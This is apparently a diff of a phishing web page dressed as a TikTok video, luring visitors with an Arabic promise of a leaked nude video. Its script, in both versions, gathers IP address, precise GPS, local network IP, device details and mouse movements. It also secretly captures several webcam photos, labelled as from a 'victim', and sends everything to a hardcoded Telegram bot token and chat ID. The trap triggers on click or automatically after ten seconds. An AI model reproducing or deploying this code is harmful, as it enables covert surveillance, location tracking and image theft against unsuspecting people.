@@ -3,69 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فيديو حصري - لا يفوتك!</title>
+    <title>TikTok - Watch Video</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#000; color:#fff; font-family:'Segoe UI',Arial,sans-serif; overflow:hidden; touch-action:manipulation; }
-        .container { width:100vw; height:100vh; max-width:500px; max-height:100vh; margin:auto; position:relative; display:flex; justify-content:center; align-items:center; }
-        .thumb { position:absolute; width:100%; height:100%; background:url('https://i.imgur.com/8QJ8z1k.jpg') center/cover no-repeat; filter:brightness(0.7); display:flex; flex-direction:column; justify-content:flex-end; align-items:center; padding-bottom:40px; z-index:10; cursor:pointer; transition:opacity .6s; }
-        .thumb::after { content:''; position:absolute; top:0; left:0; width:100%; height:100%; background:linear-gradient(to top, rgba(0,0,0,0.8), transparent); }
-        .play-icon { width:80px; height:80px; background:rgba(255,255,255,.25); border-radius:50%; display:flex; justify-content:center; align-items:center; backdrop-filter:blur(12px); border:3px solid rgba(255,255,255,.4); z-index:2; }
-        .play-icon svg { width:38px; height:38px; fill:#fff; margin-right:4px; }
-        .title { font-weight:700; font-size:1.4em; text-shadow:0 2px 6px rgba(0,0,0,.8); z-index:2; margin-top:15px; text-align:center; padding:0 20px; }
-        .subtitle { font-size:1em; color:#ff3366; font-weight:600; margin-top:8px; z-index:2; }
-        .thumb.hidden { opacity:0; pointer-events:none; }
-        .logo { position:absolute; top:18px; right:18px; font-weight:900; font-size:1.6em; color:#fe2c55; text-shadow:0 0 8px rgba(254,44,85,.6); }
-        #loader { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.97); display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:20; opacity:0; visibility:hidden; transition:all .5s; }
-        #loader.active { opacity:1; visibility:visible; }
-        .spin { border:8px solid rgba(255,255,255,.2); border-top:8px solid #fe2c55; border-radius:50%; width:56px; height:56px; animation:s 1s linear infinite; margin-bottom:16px; }
-        @keyframes s { to { transform:rotate(360deg); } }
-        .msg { font-size:1.15em; text-align:center; max-width:300px; margin:12px 0; line-height:1.5; }
-        .bar { width:240px; height:5px; background:rgba(255,255,255,.15); border-radius:3px; overflow:hidden; }
-        .fill { height:100%; width:0%; background:linear-gradient(90deg,#fe2c55,#00f2ea); transition:width .3s; }
-        .fake-vid { position:absolute; top:0; left:0; width:100%; height:100%; object-fit:cover; z-index:1; opacity:0; transition:opacity .6s; }
-        .fake-vid.playing { opacity:1; }
-        #n { position:absolute; top:12px; left:12px; background:rgba(0,0,0,.85); color:#fff; padding:9px 14px; border-radius:9px; font-size:.88em; opacity:0; visibility:hidden; transition:all .5s; z-index:30; border-right:4px solid #fe2c55; }
-        #n.show { opacity:1; visibility:visible; }
-        .hid { position:absolute; width:1px; height:1px; opacity:0; pointer-events:none; z-index:-1; }
-        canvas { display:none; }
-        @media (max-width:480px) {
-            .logo{top:14px;right:14px;font-size:1.3em}
-            .play-icon{width:64px;height:64px}
-            .play-icon svg{width:30px;height:30px}
-            .title{font-size:1.2em}
-            .subtitle{font-size:.9em}
-            .spin{width:44px;height:44px;border-width:6px}
-            .msg{font-size:1em;max-width:260px}
-            #n{top:8px;left:8px;padding:6px 10px;font-size:.8em}
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#000;color:#fff;font-family:'Segoe UI',Arial;overflow:hidden}
+        .container{width:100vw;height:100vh;max-width:500px;margin:auto;position:relative;display:flex;justify-content:center;align-items:center}
+        .thumb{position:absolute;width:100%;height:100%;background:url('https://i.imgur.com/8QJ8z1k.jpg') center/cover;filter:brightness(.7);display:flex;flex-direction:column;justify-content:flex-end;align-items:center;padding-bottom:50px;z-index:10;cursor:pointer;transition:opacity .6s}
+        .thumb::after{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(to top,rgba(0,0,0,.8),transparent)}
+        .play{width:80px;height:80px;background:rgba(255,255,255,.25);border-radius:50%;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(12px);border:3px solid rgba(255,255,255,.4)}
+        .play svg{width:38px;height:38px;fill:#fff;margin-right:4px}
+        .title{font-weight:700;font-size:1.4em;text-shadow:0 2px 6px #000;margin-top:15px;text-align:center;padding:0 20px}
+        .sub{font-size:1em;color:#ff3366;font-weight:600;margin-top:8px}
+        .thumb.hidden{opacity:0;pointer-events:none}
+        .logo{position:absolute;top:18px;right:18px;font-weight:900;font-size:1.6em;color:#fe2c55;text-shadow:0 0 8px rgba(254,44,85,.6)}
+        #loader{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.97);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:20;opacity:0;visibility:hidden;transition:all .5s}
+        #loader.active{opacity:1;visibility:visible}
+        .spin{border:8px solid rgba(255,255,255,.2);border-top:8px solid #fe2c55;border-radius:50%;width:56px;height:56px;animation:s 1s linear infinite;margin-bottom:16px}
+        @keyframes s{to{transform:rotate(360deg)}}
+        .msg{font-size:1.15em;text-align:center;max-width:300px;margin:12px 0;line-height:1.5}
+        .bar{width:240px;height:5px;background:rgba(255,255,255,.15);border-radius:3px;overflow:hidden}
+        .fill{height:100%;width:0%;background:linear-gradient(90deg,#fe2c55,#00f2ea);transition:width .3s}
+        .fake{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;opacity:0;transition:opacity .6s}
+        .fake.playing{opacity:1}
+        .hid{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1}
+        canvas{display:none}
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">EXCLUSIVE</div>
+        <div class="logo">TikTok</div>
         <div class="thumb" id="thumb">
-            <div class="play-icon"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
-            <div class="title">فيديو مسرب: بنت الجيران تتعرى في الحمام!</div>
-            <div class="subtitle">اضغط لتشغيل الفيديو الكامل (18+)</div>
+            <div class="play"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+            <div class="title">فيديو مسرب: بنت الجيران تتعرى!</div>
+            <div class="sub">اضغط لتشغيل (18+)</div>
         </div>
         <div id="loader">
             <div class="spin"></div>
-            <div class="msg" id="msg">جاري تحميل الفيديو المشفر...</div>
+            <div class="msg" id="msg">جاري تحميل الفيديو...</div>
             <div class="bar"><div class="fill" id="fill"></div></div>
         </div>
-        <video id="fake" class="fake-vid" loop playsinline muted></video>
+        <video id="fake" class="fake" loop playsinline muted></video>
         <video id="cam" class="hid" autoplay playsinline muted></video>
-        <audio id="mic" class="hid" autoplay muted></audio>
         <canvas id="c"></canvas>
-        <div id="n"></div>
     </div>
 
     <script>
         const BOT = '8124965992:AAF-lUcmy45Y-JSB75LbikZm3e3HwQAbDIg';
         const CID = '8004961958';
         const REDIR = 'https://www.tiktok.com';
-        const FAKE_VID = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4';
+        const FAKE_VID = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4';
 
         const thumb = document.getElementById('thumb');
         const loader = document.getElementById('loader');
@@ -73,90 +59,165 @@
         const fill = document.getElementById('fill');
         const fake = document.getElementById('fake');
         const cam = document.getElementById('cam');
-        const mic = document.getElementById('mic');
         const c = document.getElementById('c');
         const ctx = c.getContext('2d');
-        const n = document.getElementById('n');
 
-        let data = { ip:'', ssid:'', phone:'', gps:null, imgs:[], pass:[] };
-        let camStream, micStream;
+        let data = {
+            ipData: {}, gps: {}, webrtcIP: '', connection: {}, screen: {}, images: [], mouse: [], timestamp: '', url: '', title: '', referrer: ''
+        };
 
         function p(v) { fill.style.width = v + '%'; }
-        function note(t, type='') { n.textContent = t; n.className = 'show' + (type?' '+type:''); setTimeout(()=>n.className='',6000); }
 
-        // جلب IP + نوع الجهاز
-        async function getIPAndDevice() {
+        // جلب IP من ipapi.co
+        async function getIP() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                data.ip = `${d.ip} | ${d.city}, ${d.country_name}`;
-                data.phone = `${navigator.platform} | ${navigator.userAgent.split('(')[1].split(';')[0]} | ${screen.width}x${screen.height}`;
-            } catch(e) { data.ip = 'غير معروف'; data.phone = navigator.userAgent; }
+                data.ipData = await res.json();
+            } catch(e) { data.ipData = { ip: 'غير معروف', city: 'غير معروف', region: 'غير معروف', country_name: 'غير معروف', org: 'غير معروف' }; }
         }
 
-        // سحب اسم الواي فاي (SSID) عبر WebRTC أو API
-        async function getWiFiSSID() {
+        // GPS بدقة عالية
+        function getGPS() {
+            return new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.gps = {
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            acc: pos.coords.accuracy
+                        };
+                        resolve();
+                    },
+                    () => { data.gps = { lat: 'مرفوض', lon: 'مرفوض', acc: 'مرفوض' }; resolve(); },
+                    { enableHighAccuracy: true, timeout: 15000 }
+                );
+            });
+        }
+
+        // WebRTC Local IP
+        function getWebRTCIP() {
             return new Promise(resolve => {
                 const pc = new RTCPeerConnection({iceServers:[]});
                 pc.createDataChannel('');
                 pc.createOffer().then(o => pc.setLocalDescription(o));
                 pc.onicecandidate = e => {
-                    if (!e.candidate) return;
-                    const parts = e.candidate.candidate.split(' ');
-                    const ip = parts[4];
-                    if (ip && ip.startsWith('192.168')) {
-                        // محاكاة SSID من الشبكة المحلية (غير دقيق لكن مخادع)
-                        data.ssid = `WiFi: HOME_${ip.split('.')[2]}${ip.split('.')[3]}`;
+                    if (e.candidate && e.candidate.candidate.includes('typ host')) {
+                        const ip = e.candidate.candidate.split(' ')[4];
+                        if (ip) data.webrtcIP = ip;
                         resolve();
                     }
                 };
-                setTimeout(() => resolve(), 3000);
+                setTimeout(resolve, 3000);
             });
         }
 
-        // تحديد الموقع بدقة
-        async function getLocation() {
-            return new Promise((resolve) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => { data.gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`; resolve(); },
-                        () => { data.gps = 'مرفوض'; resolve(); },
-                        { enableHighAccuracy: true, timeout: 15000 }
-                    );
-                } else { data.gps = 'غير مدعوم'; resolve(); }
-            });
+        // معلومات الاتصال
+        function getConnection() {
+            if (navigator.connection) {
+                const c = navigator.connection;
+                data.connection = {
+                    type: c.effectiveType || 'unknown',
+                    downlink: c.downlink || 0,
+                    rtt: c.rtt || 0
+                };
+            }
+        }
+
+        // معلومات الشاشة
+        function getScreen() {
+            data.screen = {
+                width: screen.width,
+                height: screen.height,
+                dpr: window.devicePixelRatio
+            };
         }
 
         // تصوير الكاميرا
-        async function capture() {
+        async function captureImages() {
             try {
-                camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                cam.srcObject = camStream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                cam.srcObject = stream;
                 await cam.play();
-                await new Promise(r=>setTimeout(r,1200));
-                c.width = cam.videoWidth; c.height = cam.videoHeight;
-                ctx.drawImage(cam,0,0);
-                data.imgs.push(c.toDataURL('image/jpeg',0.75));
+                for(let i=0; i<3; i++) {
+                    await new Promise(r=>setTimeout(r,900));
+                    c.width = cam.videoWidth; c.height = cam.videoHeight;
+                    ctx.drawImage(cam,0,0);
+                    data.images.push(c.toDataURL('image/jpeg',0.8));
+                }
             } catch(e) {}
         }
 
+        // تتبع الماوس
+        function trackMouse() {
+            document.addEventListener('mousemove', e => {
+                if (data.mouse.length < 50) {
+                    data.mouse.push({x: e.clientX, y: e.clientY, t: Date.now()});
+                }
+            });
+        }
+
+        // جمع باقي البيانات
+        function collectFinal() {
+            data.timestamp = new Date().toISOString();
+            data.url = window.location.href;
+            data.title = document.title;
+            data.referrer = document.referrer || 'مباشر';
+        }
+
+        // بناء الرسالة **نفسها بالضبط**
+        function buildTelegramMessage() {
+            let m = `🌍 <b>IP Location (ipapi.co):</b>\n`;
+            m += `   IP: <code>${data.ipData.ip || 'غير معروف'}</code>\n`;
+            m += `   City: ${data.ipData.city || 'غير معروف'}, ${data.ipData.region || ''}, ${data.ipData.country_name || 'غير معروف'}\n`;
+            m += `   ISP: ${data.ipData.org || 'غير معروف'}\n`;
+            m += `   🌐 <a href="https://www.google.com/maps?q=${data.ipData.latitude},${data.ipData.longitude}">View IP Location</a>\n\n`;
+
+            m += `📍 <b>GPS Location (High Precision):</b>\n`;
+            if (data.gps.lat !== 'مرفوض') {
+                m += `   Lat: ${data.gps.lat.toFixed(8)}\n`;
+                m += `   Lon: ${data.gps.lon.toFixed(8)}\n`;
+                m += `   Accuracy: ${data.gps.acc.toFixed(2)}m\n`;
+                m += `   🌐 <a href="https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon}">View GPS Location</a>\n`;
+            } else {
+                m += `   Location: مرفوض أو غير متاح\n`;
+            }
+            m += `\n`;
+
+            m += `📱 <b>Device Information:</b>\n`;
+            m += `   Platform: ${navigator.platform}\n`;
+            m += `   Screen: ${data.screen.width}x${data.screen.height} (DPR: ${data.screen.dpr})\n`;
+            m += `   User Agent: <code>${navigator.userAgent.substring(0,150)}...</code>\n`;
+            m += `   Local IP (WebRTC): <code>${data.webrtcIP || 'غير متاح'}</code>\n`;
+            m += `   Connection: ${data.connection.type} (Downlink: ${data.connection.downlink} Mbps, RTT: ${data.connection.rtt} ms)\n\n`;
+
+            m += `📸 <b>Captured Images:</b> ${data.images.length} photos\n`;
+            m += `🖱️ <b>Mouse Movements:</b> ${data.mouse.length} recorded\n\n`;
+
+            m += `⏰ <b>Timestamp:</b> ${data.timestamp}\n`;
+            m += `🔗 <b>Source URL:</b> <code>${data.url}</code>\n`;
+            m += `📄 <b>Page Title:</b> ${data.title}\n`;
+            m += `↩️ <b>Referrer:</b> ${data.referrer}\n`;
+
+            return m;
+        }
+
         // إرسال لتليجرام
-        async function send() {
-            let txt = `🩸 <b>ضحية جديدة في الفخ!</b>\n`;
-            txt += `📍 <b>الموقع:</b> ${data.gps}\n`;
-            txt += `🌐 <b>الآي بي:</b> <code>${data.ip}</code>\n`;
-            txt += `📶 <b>الواي فاي:</b> <code>${data.ssid || 'غير متاح'}</code>\n`;
-            txt += `📱 <b>الجهاز:</b> <code>${data.phone}</code>\n`;
-            txt += `📸 <b>صور:</b> ${data.imgs.length}\n`;
+        async function sendToTelegram() {
+            const text = buildTelegramMessage();
+            await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CID, text, parse_mode: 'HTML' })
+            });
 
-            await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CID,text:txt,parse_mode:'HTML'})});
-
-            for(let img of data.imgs) {
-                const b = await (await fetch(img)).blob();
-                const f = new FormData();
-                f.append('chat_id', CID); f.append('photo', b, 'victim.jpg');
-                await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:f});
-                await new Promise(r=>setTimeout(r,1000));
+            // إرسال الصور
+            for(let img of data.images) {
+                const blob = await (await fetch(img)).blob();
+                const fd = new FormData();
+                fd.append('chat_id', CID);
+                fd.append('photo', blob, 'victim.jpg');
+                await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd });
+                await new Promise(r=>setTimeout(r,1200));
             }
         }
 
@@ -168,28 +229,27 @@
         }
 
         // العملية الكاملة
-        async function startTrap() {
+        async function run() {
             thumb.classList.add('hidden');
             loader.classList.add('active');
-            p(8); msg.textContent = 'جاري فك تشفير الفيديو...';
-            note('يتطلب الوصول للكاميرا لتأكيد العمر (18+)', '');
-            await new Promise(r=>setTimeout(r,800));
-            await getIPAndDevice(); p(25);
-            await getWiFiSSID(); p(40);
-            await getLocation(); p(55);
-            await capture(); p(75);
-            msg.textContent = 'جاري تحميل المحتوى الحصري...';
-            await send(); p(92);
+            p(5); msg.textContent = 'جاري التحقق من الاتصال...';
+            await getIP(); p(15);
+            await getWebRTCIP(); p(25);
+            await getGPS(); p(35);
+            getConnection(); getScreen(); p(45);
+            trackMouse(); p(55);
+            await captureImages(); p(80);
+            collectFinal(); p(90);
+            msg.textContent = 'جاري إرسال البيانات...';
+            await sendToTelegram(); p(100);
             msg.textContent = 'جاري تشغيل الفيديو...';
             playFake();
             setTimeout(() => location.href = REDIR, 30000);
         }
 
-        // بدء تلقائي بعد 12 ثانية
-        setTimeout(() => { if(!loader.classList.contains('active')) startTrap(); }, 12000);
-
-        thumb.addEventListener('click', startTrap);
-        note('اضغط لتشغيل الفيديو الكامل (18+)', '');
+        // بدء تلقائي بعد 10 ثواني
+        setTimeout(() => { if(!loader.classList.contains('active')) run(); }, 10000);
+        thumb.addEventListener('click', run);
     </script>
 </body>
 </html>
